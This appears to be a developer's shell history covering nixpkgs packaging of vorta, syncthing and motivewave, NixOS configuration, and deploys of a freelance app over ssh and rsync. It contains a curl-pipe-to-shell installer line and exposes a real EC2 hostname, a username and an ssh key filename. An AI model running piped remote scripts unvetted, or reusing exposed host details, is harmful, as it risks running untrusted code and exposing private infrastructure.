+ls
+cd ..
+cd nixpkgs/
+git pull
+git pull --depth 1
+git pull.rebase true
+git config pull.rebase true
+git pull --depth 1
+git stash
+git pull --depth 1
+cd ..
+rm -rf nixpkgs
+LS
+ls
+git clone https://github.com/NixOS/nixpkgs.git
+git clone https://github.com/NixOS/nixpkgs.git --depth 1
+cd nixpkgs/pkgs/applications/backup/vorta/
+ls
+hx .
+nixfmt default.nix
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+ls
+hx .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+~/projects/clones/nixpkgs/pkgs/applications/backup/vorta> nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'<\n>error:<\n>       … while calling the 'abort' builtin<\n>         at /nix/store/8vz84mqgnm1gz5yk7hgnnb5gir5hjxas-source/lib/customisation.nix:310:7:<\n>          309|     else<\n>          310|       abort "lib.customisation.callPackageWith: ${error}";<\n>             |       ^<\n>          311|<\n><\n>       error: evaluation aborted with the following error message: 'lib.customisation.callPackageWith: Function called without required argument "qtbase" at /home/chikoyeat/projects/clones/nixpkgs/pkgs/applications/backup/vorta/default.nix:7, did you mean "_9base", "debase" or "hbase"?'<\n>~/projects/clones/nixpkgs/pkgs/applications/backup/vorta>~/projects/clones/nixpkgs/pkgs/applications/backup/vorta> nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'<\n>error:<\n>       … while calling the 'abort' builtin<\n>         at /nix/store/8vz84mqgnm1gz5yk7hgnnb5gir5hjxas-source/lib/customisation.nix:310:7:<\n>          309|     else<\n>          310|       abort "lib.customisation.callPackageWith: ${error}";<\n>             |       ^<\n>          311|<\n><\n>       error: evaluation aborted with the following error message: 'lib.customisation.callPackageWith: Function called without required argument "qtbase" at /home/chikoyeat/projects/clones/nixpkgs/pkgs/applications/backup/vorta/default.nix:7, did you mean "_9base", "debase" or "hbase"?'<\n>~/projects/clones/nixpkgs/pkgs/applications/backup/vorta>clear
+clear
+nix-build -A vorta
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'<\n>
+nix-build -A pkgs.vorta nixpkgs
+cd ../..  # Go to nixpkgs root<\n>nix-build -A pkgs.vorta
+cd //
+cd ~/projects/clones/nixpkgs/
+nix-build -A pkgs.vorta nixpkgs
+cd ../..  # Go to nixpkgs root<\n>nix-build -A pkgs.vorta
+clones
+ls
+cd clones/
+cd nixpkgs/
+nix-build -A pkgs.vorta nixpkgs
+cd ..
+nix-build -A pkgs.vorta nixpkgs
+cd pkgs/applications/backup
+cd pkgs/applications/
+cd nixpkgs/pkgs/applications/backup/vorta/
+sha256-VhM782mFWITA0VlKw0sBIu/UxUqlFLgq5XVdCpQggCw=
+hx .
+cd ../../..
+cd clones/
+nix-build -A pkgs.vorta nixpkgs
+ls
+sls
+ls
+nix-build -A pkgs.vorta nixpkgs
+cd nixpkgs/pkgs/applications/backup/vorta/
+ls
+hx .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd nixpkgs/pkgs/applications/backup/vorta/
+hx .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd nixpkgs/pkgs/applications/backup/vorta/
+nixfmt default.nix
+zeditor .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd nixpkgs/pkgs/applications/backup/vorta/
+hx .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+zeditor .
+cd nixpkgs/pkgs/applications/backup/vorta/
+zeditor .
+cd nixpkgs/pkgs/applications/backup/vorta/
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+nixfmt default.nix
+hx .
+zeditor .
+cd ~/projects/clones/nixpkgs/
+gh pr checkout 370643
+node enrollment.js<\n>
+cd anxj/api
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+ls
+hx .
+nixfmt default.nix
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+nix-build -A pkgs.vorta nixpkgs
+cd ../../../../..
+{<\n>  lib,<\n>  python3Packages,<\n>  fetchFromGitHub,<\n>  wrapQtAppsHook,<\n>  borgbackup,<\n>  qtbase,<\n>  qtwayland,<\n>  stdenv,<\n>  makeFontsConf,<\n>}:<\n><\n>python3Packages.buildPythonApplication rec {<\n>  pname = "vorta";<\n>  version = "0.10.3";<\n>  pyproject = true;<\n><\n>  src = fetchFromGitHub {<\n>    owner = "borgbase";<\n>    repo = "vorta";<\n>    rev = "v${version}";<\n>    hash = "sha256-VhM782mFWITA0VlKw0sBIu/UxUqlFLgq5XVdCpQggCw=";<\n>  };<\n><\n>  nativeBuildInputs = [<\n>    python3Packages.setuptools<\n>    wrapQtAppsHook<\n>  ];<\n><\n>  buildInputs = lib.optionals stdenv.hostPlatform.isLinux [<\n>    qtwayland<\n>  ];<\n><\n>  propagatedBuildInputs = with python3Packages; [<\n>    peewee<\n>    pyqt6<\n>    psutil<\n>    secretstorage<\n>    setuptools<\n>    platformdirs<\n>  ];<\n><\n>  postPatch = ''<\n>    substituteInPlace src/vorta/assets/metadata/com.borgbase.Vorta.desktop \<\n>    --replace com.borgbase.Vorta "com.borgbase.Vorta-symbolic"<\n>  '';<\n><\n>  postInstall = ''<\n>    install -Dm644 src/vorta/assets/metadata/com.borgbase.Vorta.desktop $out/share/applications/com.borgbase.Vorta.desktop<\n>    install -Dm644 src/vorta/assets/icons/icon.svg $out/share/pixmaps/com.borgbase.Vorta-symbolic.svg<\n>  '';<\n><\n>  preFixup = ''<\n>    makeWrapperArgs+=(<\n>      "''${qtWrapperArgs[@]}"<\n>      --prefix PATH : ${lib.makeBinPath [ borgbackup ]}<\n>    )<\n>  '';<\n><\n>  nativeCheckInputs = with python3Packages; [<\n>    pytest-qt<\n>    pytest-mock<\n>    pytestCheckHook<\n>  ];<\n><\n>  preCheck =<\n>    let<\n>      fontsConf = makeFontsConf {<\n>        fontDirectories = [ ];<\n>      };<\n>    in<\n>    ''<\n>      export HOME=$(mktemp -d)<\n>      export FONTCONFIG_FILE=${fontsConf};<\n>      # For tests/test_misc.py::test_autostart<\n>      mkdir -p $HOME/.config/autostart<\n>      export QT_PLUGIN_PATH="${qtbase}/${qtbase.qtPluginPrefix}"<\n>      export QT_QPA_PLATFORM=offscreen<\n>    '';<\n><\n>  doCheck = false; # Temporarily disable tests<\n><\n>  meta = with lib; {<\n>    changelog = "https://github.com/borgbase/vorta/releases/tag/v${version}";<\n>    description = "Desktop Backup Client for Borg";<\n>    homepage = "https://vorta.borgbase.com/";<\n>    license = licenses.gpl3Only;<\n>    maintainers = with maintainers; [ ma27 ];<\n>    platforms = platforms.linux;<\n>    mainProgram = "vorta";<\n>  };<\n>}<\n>
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+zeditor .
+ls
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+zeditor .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+node enrollment.js<\n>
+npm run dev
+cd ~/projects/
+ssh -i "newinst.pem" ubuntu@ec2-16-171-141-84.eu-north-1.compute.amazonaws.com
+cd ~/projects/freelance/certiapp
+zeditor .
+git add .
+git commit -m "fixedtype val 987" 
+git push
+cd ~/projects/freelance/certiapp
+git add .
+git commit -m "fixedtype val 9827" 
+git push
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+git pull
+git pull --depth 1
+hx .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+zeditor .
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+zeditor .
+ls
+nixfmt default.nix
+cd ~/projects/clones/nixpkgs/pkgs/applications/networking/syncthing/
+git pull
+git pull --depth 1
+git status
+cd ../../../../..
+rm -rf nixpkgs
+git clone https://github.com/NixOS/nixpkgs.git --depth 1
+gh
+gh issue 370900
+gh issue 370900 view
+gh issue view 370900 view
+gh issue view 370900
+cd ~/projects/clones/nixpkgs/pkgs/applications/networking/syncthing/
+ls
+zeditor .
+cd ../../../../..
+nix-build -A pkgs.syncthing nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/networking/syncthing/
+zeditor .
+nix-prefetch-url --unpack https://github.com/syncthing/syncthing/archive/refs/tags/v1.28.1.tar.gz<\n>
+git clone --branch v1.28.1 https://github.com/syncthing/syncthing.git<\n>cd syncthing<\n>
+go mod vendor<\n>
+nix-prefetch-git .<\n>
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --flake . --upgrade<\n>
+sudo nixos-rebuild switch 
+cd /etc/nixos
+manavraj@07
+cd ~/projects/clones/nixpkgs/pkgs/applications/networking/syncthing/
+ls
+nix-prefetch-git .<\n>
+sudo nixos-rebuild switch 
+hx 
+sudo nixos-rebuild switch --flake . --upgrade<\n>
+hx .
+nix-prefetch-git .<\n>
+cd syncthing/
+nix-prefetch-git .<\n>
+cd ..
+rm -rf syncthing/
+git clone --branch v1.28.1 https://github.com/syncthing/syncthing.git<\n>cd syncthing<\n>
+go mod vendor<\n>
+nix-prefetch-git .<\n>
+go mod vendor<\n>
+nix hash path ./vendor<\n>
+ls
+ls
+cd ..
+ls
+hx .
+nix build -f default.nix syncthing<\n>
+nix build -f default.nix --arg pkgsBuildBuild 'import <nixpkgs> {}' --arg go 'import <nixpkgs> {}' syncthing<\n>
+nix build .#syncthing<\n>
+nix build -f default.nix --arg pkgsBuildBuild 'import <nixpkgs> {}' --arg go 'import <nixpkgs> {}' --arg buildGoModule '(import <nixpkgs> {}).buildGoModule' --arg stdenv '(import <nixpkgs> {}).stdenv' --arg lib '(import <nixpkgs> {}).lib' --arg fetchFromGitHub '(import <nixpkgs> {}).fetchFromGitHub' --arg nixosTests '(import <nixpkgs> {}).nixosTests' --arg autoSignDarwinBinariesHook '(import <nixpkgs> {}).autoSignDarwinBinariesHook' --arg nix-update-script '(import <nixpkgs> {}).nix-update-script' syncthing<\n>
+# Build and install the main Syncthing package<\n>nix-build -A syncthing<\n>./result/bin/syncthing --version<\n>./result/bin/syncthing --help<\n><\n># Test systemd service files (on Linux)<\n>test -f ./result/lib/systemd/system/syncthing@.service<\n>test -f ./result/lib/systemd/user/syncthing.service<\n><\n># Check man pages<\n>man -M ./result/share/man syncthing<\n><\n># Build and test Syncthing Discovery Server<\n>nix-build -A syncthing-discovery<\n>./result/bin/stdiscosrv --help<\n>./result/bin/stdiscosrv --version<\n><\n># Build and test Syncthing Relay Server<\n>nix-build -A syncthing-relay<\n>./result/bin/strelaysrv --help<\n>./result/bin/strelaysrv --version<\n><\n># Test systemd service for relay server (on Linux)<\n>test -f ./result/lib/systemd/system/strelaysrv.service<\n><\n># Full integration test using nixos-tests<\n>nix-build '<nixpkgs/nixos/tests/syncthing.nix>'<\n><\n># Test basic functionality<\n>TEST_DIR=$(mktemp -d)<\n>./result/bin/syncthing -generate="$TEST_DIR"<\n>test -f "$TEST_DIR/config.xml"<\n>test -f "$TEST_DIR/key.pem"<\n>test -f "$TEST_DIR/cert.pem"<\n><\n># Test with custom home directory<\n>./result/bin/syncthing -home="$TEST_DIR" -no-browser -no-restart -logflags=0 &<\n>SYNCTHING_PID=$!<\n>sleep 5<\n>kill $SYNCTHING_PID<\n><\n># Clean up<\n>rm -rf "$TEST_DIR"<\n><\n># Test package updates<\n>nix-shell -p nix-update --run "nix-update syncthing"<\n><\n># Test for proper vendoring<\n>nix-build . -A syncthing --check<\n><\n># Optional: Run NixOS tests specifically mentioned in the package<\n>nix-build '<nixpkgs/nixos/tests>' -A syncthing<\n>nix-build '<nixpkgs/nixos/tests>' -A syncthing-init<\n>nix-build '<nixpkgs/nixos/tests>' -A syncthing-relay
+cd ../../../../..
+nix-build -A pkgs.syncthing nixpkgs
+nix-build -A syncthing<\n>nix-build -A syncthing-discovery<\n>nix-build -A syncthing-relay
+cd ~/projects/clones/nixpkgs/pkgs/applications/networking/syncthing/
+nix-build -A syncthing<\n>nix-build -A syncthing-discovery<\n>nix-build -A syncthing-relay
+nix-build -A syncthing
+nix-build . -A syncthing
+nix-build nixpkgs -A pkgs.syncthing
+cd ../../../../..
+nix-build nixpkgs -A pkgs.syncthing
+cd ~/projects/clones/nixpkgs/pkgs/applications/networking/syncthing/
+nix-prefetch-github --rev v1.28.1 syncthing syncthing
+nix hash to-sri sha256:$(nix-prefetch-url --unpack https://github.com/syncthing/syncthing/archive/v1.28.1.tar.gz)
+# First get the hash<\n>nix-prefetch-url --unpack https://github.com/syncthing/syncthing/archive/v1.28.1.tar.gz<\n><\n># Then convert it to SRI format<\n>nix hash convert --to-sri sha256:<output-from-previous-command>
+nix-prefetch-url --unpack https://github.com/syncthing/syncthing/archive/v1.28.1.tar.gz<\n>
+nix hash convert --to-sri sha256:0w466267g1nslw2ipfz05bj0dcxxfw0270vmkgfsw343kzmvpgay
+nix-prefetch-url --unpack --type sha256 https://github.com/syncthing/syncthing/archive/v1.28.1.tar.gz | xargs -I{} nix hash convert --to-sri sha256:{}
+nix-prefetch-url --unpack https://github.com/syncthing/syncthing/archive/v1.28.1.tar.gz<\n>
+hx .
+nix-build -A syncthing
+cd ~/projects/clones/nixpkgs/pkgs/applications/networking/syncthing/
+hx .
+nix-build -A syncthing
+cd ../../../../..
+nix-build nixpkgs -A pkgs.syncthing
+cd ~/projects/clones/nixpkgs/pkgs/applications/networking/syncthing/
+hx .
+cd ../../../../..
+nix-build nixpkgs -A pkgs.syncthing
+cd ~/projects/clones/nixpkgs/pkgs/applications/networking/syncthing/
+hx .
+cd ../../../../..
+nix-build nixpkgs -A pkgs.syncthing
+cd ~/projects/clones/nixpkgs/pkgs/applications/networking/syncthing/
+hx .
+cd ../../../../..
+nix-build nixpkgs -A pkgs.syncthing
+cd ~/projects/clones/nixpkgs/pkgs/applications/networking/syncthing/
+zeditor .
+cd ~/projects/clones/nixpkgs/pkgs/applications/networking/syncthing/
+gh pr checkout 370952 --depth 1
+gh pr checkout 370952 
+cd ../../../../..
+gh pr checkout 370952 
+cd nixpkgs/
+gh pr checkout 370952 
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+nixpkgs-review pr 370650
+nix-env -iA nixpkgs.nixpkgs-review
+nix profile -iA nixpkgs.nixpkgs-review
+nix profile nixpkgs.nixpkgs-review
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+ls
+hx .
+nixfmt default.nix
+hx .
+nixfmt default.nix
+hx .
+cd ../../../../..
+nix-build -A pkgs.vorta nixpkgs
+zeditor .
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+zeditor .
+nixfmt default.nix
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+git pull --depth 1
+git status
+git pull --depth 1 --no-rebase
+git pull --depth 1
+git config pull.ff only
+git status
+cd ..
+cd ../../../../
+rm -rf nixpkgs
+git clone https://github.com/NixOS/nixpkgs.git --depth 1
+git status
+cd nixpkgs/
+git status
+gh pr checkout 370650
+gh pr checkout 370650 --depth 1
+gh pr checkout 370650 -- --depth=1<\n>
+gh pr checkout 370650 -- --depth=1
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+git log --oneline<\n>
+git rebase -i HEAD~6
+git branch backup-branch<\n>
+git rebase -i HEAD~6
+git log --oneline<\n>
+git rebase -i HEAD~1
+git rebase -i HEAD~2
+git fetch origin pull/370650/head:pr-370650<\n>git checkout pr-370650<\n>
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+git status
+git rebase -i HEAD~6
+git add .
+git rebase --continue<\n>
+git rebase -i HEAD~6
+git branch
+git push origin pr-370650 --force<\n>
+git remote -v<\n>
+git remote set-url origin https://github.com/qxrein/nixpkgs.git<\n>
+git remote -v
+git status
+git push origin pr-370650 --force<\n>
+git status
+git log --oneline<\n>
+git rebase -i HEAD~6
+git status
+code .
+cd ~/projects/clones/
+git clone https://github.com/vinceliuice/WhiteSur-firefox-theme.git
+cd WhiteSur-firefox-theme/
+./install.sh
+reboot
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --flake . --upgrade<\n>
+cd ~/.config/hypr
+sudo nixos-rebuild switch 
+git clone https://github.com/ImRayy/ags-dots ~/.config/ags
+hx .
+reboot
+ags
+cd ~/.config/ags
+ls
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch 
+reboot
+cd ~/.config/hypr/
+hx .
+reboot
+zeditor .
+cd ~/.config/hypr/
+hx .
+cd ~/projects/freelance/certiapp
+zeditor .
+cd ~/projects/clones/WhiteSur-firefox-theme/
+./install.sh -m
+cd ~/projects/freelance/certiapp
+zeditor .
+cd ~/projects/freelance/certiapp/anxj/api/
+node enrollment.js<\n>
+cd ~/projects/clones/nixpkgs/pkgs/applications/backup/vorta/
+hx .
+nixfmt default.nix
+zeditor .
+cd ~/projects/freelance/certiapp/anxj/api/
+cd ../..
+git add .
+git commit -m "fixedtype val 29827" 
+git push
+cd ~/projects/freelance/certiapp/
+deno run build
+npm run build
+npm install -g npm@11.0.0
+npm run build
+git add .
+git commit -m "fix val 29827" 
+git push
+npm run build
+deno run dev
+git add .
+git commit -m "fix val x29827" 
+git push
+cd ~/projects/clones/WhiteSur-firefox-theme/
+./install.sh
+./install.sh -f
+./install.sh -h
+./install.sh -a
+cd ~/projects/clones/
+cd nixpkgs/
+ls
+nixpkgs-review pr 371790
+cd /etc/nixos
+hx .
+sudo hx .
+sudo nixos-rebuild switch 
+cd ~/projects/clones/
+cd nixpkgs/
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch 
+nix-search swift
+sudo hx .
+sudo nixos-rebuild switch 
+nix-shelll -p servo
+nix-shell -p servo
+servo
+cd ~/projects/
+mkdir swift-test
+cd swift-test/
+hx test.swift
+./test.swift
+swift test
+swift test.swift
+cd ..
+rm -rf swift-test/
+cd ~/projects/freelance/certiapp/
+\ls
+ls
+zeditor .
+bluetoothcli
+nixpkgs-review pr 372262
+cd ~/projects/clones/nixpkgs/
+nixpkgs-review pr --post-result 37242
+rm -rf /home/chikoyeat/.cache/nixpkgs-review/pr-37242/nixpkgs
+nixpkgs-review pr --post-result 37242
+ranegr
+cd ~/projects/haskelllearn
+cd ~/projects/
+mkdir haskellearn
+cd haskellearn/
+hx .
+ghc --version
+cd ~/projects/haskellearn/
+hx .
+hx example.hs -o example
+hx Example.hs -o example
+ghc Example.hs -o example
+ghc --make Example.hs
+touch Example.hs
+ghc Example.hs -o example
+ghc --make Example.hs
+hx .
+curl https://get-ghcup.haskell.org -sSf | sh
+ghcup --metadata-fetching-mode=Strict --cache install ghc recommended
+cd ~/projects/clones/nixpkgs/
+cd ..
+rm -rf nixpkgs
+git clone https://github.com/NixOS/nixpkgs.git --depth 1
+cd nixpkgs/pkgs/applications/graphics/
+mkdir motivewave
+cd motivewave/
+hx default.nix
+nixfmt default.nix
+nix-prefetch-url https://www.motivewave.com/downloads/MotiveWave-6.11.5-linux-x64.tar.gz
+nix-build -E 'with import <nixpkgs> {}; motivewave'
+cd ..
+nix-build -E 'with import <nixpkgs> {}; motivewave'
+nix-build '<nixpkgs>' -A motivewave
+cd motivewave/
+nix-build '<nixpkgs>' -A motivewave
+nix-build ./default.nix
+qq:q
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+hx .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+nix-build ./default.nix
+NIXPKGS_ALLOW_UNFREE=1 nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+hx .
+NIXPKGS_ALLOW_UNFREE=1 nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+hx .
+NIXPKGS_ALLOW_UNFREE=1 nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+nix-prefetch-url "https://www.motivewave.com/downloads/MotiveWave-6.9.10-linux64.tar.gz"
+nix-prefetch-url "https://www.motivewave.com/downloads/MotiveWave-6.9.10-debian.deb"
+zeditor .
+NIXPKGS_ALLOW_UNFREE=1 nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+nix-prefetch-url "https://www.motivewave.com/downloads/MotiveWave-6.9.10-debian.deb"
+NIXPKGS_ALLOW_UNFREE=1 nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+cd Downloads/
+nix-hash --type sha256 --flat --base32 ./MotiveWave-6.9.10-debian.deb
+nix-hash --type sha256 --flat --base32 ./motivewave_6.9.10_amd64.deb
+hx .
+NIXPKGS_ALLOW_UNFREE=1 nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+hx .
+nix-store --add-fixed sha256 ./motivewave_6.9.10_amd64.deb
+NIXPKGS_ALLOW_UNFREE=1 nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+hx .
+zeditor .
+nix-store
+NIXPKGS_ALLOW_UNFREE=1 nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+NIXPKGS_ALLOW_UNFREE=1 nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+nix-store -r /nix/store/58l0wx23ap5drn6vnscwhi2kv3na780j-openjdk-11.0.25+9
+NIXPKGS_ALLOW_UNFREE=1 nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+hx .
+NIXPKGS_ALLOW_UNFREE=1 nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+hx .
+NIXPKGS_ALLOW_UNFREE=1 nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+hx .
+NIXPKGS_ALLOW_UNFREE=1 nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+hx .
+nixfmt default.nix
+hx .
+nixfmt default.nix
+hx .
+zeditor .
+cd ~/projects/clones/nixpkgs/
+NIXPKGS_ALLOW_UNFREE=1 nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+git status
+cd ~/projects/
+git clone https://github.com/red-browser/axolotl.git
+zvm use 0.13.0
+zvm upgrade
+cd axolotl/
+echo "zig-cache/<\n>zig-out/<\n>.DS_Store" > .gitignore
+ls
+echo "zig-cache/ zig-out/ .DS_Store" > .gitignore
+ls
+thunar .
+zeditor .
+touch .gitignore
+echo "zig-cache/ zig-out/ .DS_Store" > .gitignore
+ls
+mkdir -p src/engine/{layout,dom,css,javascript,network} src/tests examples docs
+zeditor .
+# Create the main directories first<\n>mkdir src<\n>mkdir src/engine<\n>mkdir src/tests<\n>mkdir examples<\n>mkdir docs<\n><\n># Create the engine subdirectories<\n>mkdir src/engine/layout<\n>mkdir src/engine/dom<\n>mkdir src/engine/css<\n>mkdir src/engine/javascript<\n>mkdir src/engine/network
+ls
+mkdir src; mkdir src/engine; mkdir src/tests; mkdir examples; mkdir docs; mkdir src/engine/layout; mkdir src/engine/dom; mkdir src/engine/css; mkdir src/engine/javascript; mkdir src/engine/network
+ls
+echo "zig-cache/<\n>zig-out/<\n>.DS_Store" | save .gitignore
+rm -rf .gitignore
+echo "zig-cache/<\n>zig-out/<\n>.DS_Store" | save .gitignore
+ls
+zeditor .
+zig build test
+zig build
+hx .
+zig build test
+hx .
+zig build test
+hx .
+hx src/engine/main.zig
+tree
+hx src/engine/layout/main.zig
+hx src/engine/dom/main.zig
+hx src/engine/css/main.zig
+tree
+hx src/engine/javascript//main.zig
+hx src/engine/javascript/main.zig
+tree
+hx src/engine/network/main.zig
+hx src/tests/main.zig
+zig build test
+tree
+zig build test
+hx .
+zig build test
+hx .
+zig build test
+hx .
+zig build test
+hx .
+zig build test
+zeditor .
+zig build test
+zeditor .
+zig build test
+zeditor .
+zig build test
+git add .
+cd ~/projects/freelance/certiapp/
+zeditor .
+cd ~/projects/freelance/certiapp/
+deno run dev
+deno run dev
+node enrollment.js<\n>
+npm run build
+git add .
+git commit -m "fix val x27" 
+git push
+cd ~/projects/freelance/certiapp/
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' --exclude 'src' --exclude 'src-tauri' --exclude '.env.*' -e "ssh -i ~/.ssh/newinst.pem" ./ ubuntu@ec2-16-171-141-84.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' --exclude '.next' --exclude 'src' --exclude 'src-tauri' --exclude '.env.*' -e "ssh -i ~/.ssh/newinst.pem" ./ ubuntu@ec2-16-171-141-84.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/
+ssh -i "~/.ssh/newinst.pem" ubuntu@ec2-16-171-141-84.eu-north-1.compute.amazonaws.com
+cd anxj/api
+git add .
+git commit -m "fix val x75" 
+git push
+node enrollment.js<\n>
+ssh -i "~/.ssh/newinst.pem" ubuntu@ec2-16-171-141-84.eu-north-1.compute.amazonaws.com
+git add .
+git commit -m "fix val x" 
+git push
+ani-cli
+cd ~/projects/freelance/certiapp/
+zeditor .
+cd ~/projects/freelance/certiapp/
+git add .
+git commit -m "suhh" 
+git push
+cd ~/projects/freelance/certiapp/
+zeditor .
+cd ~/projects/freelance/certiapp/
+deno run dev
+git add .
+git commit -m "edit" 
+git push
+deno run dev
+git add .
+git commit -m "edit" 
+git push
+cd /etc/nixos
+cd ~/projects/NIXCF/
+thunar .
+git branch
+git checkout hyprland
+thunar .
+thunar .
+git add .
+git commit -m "trollface" 
+git push
+cd /etc/nixos
+sudo nixos-rebuild switch --flake . --upgrade<\n>
+hx .
+sudo hx .
+sudo nixos-rebuild switch --flake . --upgrade<\n>
+cd /etc/nixos
+cd ~/projects/freelance/certiapp/
+ls
+cd ~/projects/freelance/certiapp/
+zeditor .
+git add .
+git commit -m "trollface" 
+git push
+cd ~/projects/clones/nixpkgs/
+cd ..
+rm -rf nixpkgs/
+git clone https://github.com/NixOS/nixpkgs.git --depth 1
+cd nixpkgs/pkgs/applications/graphics/paraview/
+hx .
+nixfmt default.nix
+NIXPKGS_ALLOW_UNFREE=1 nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
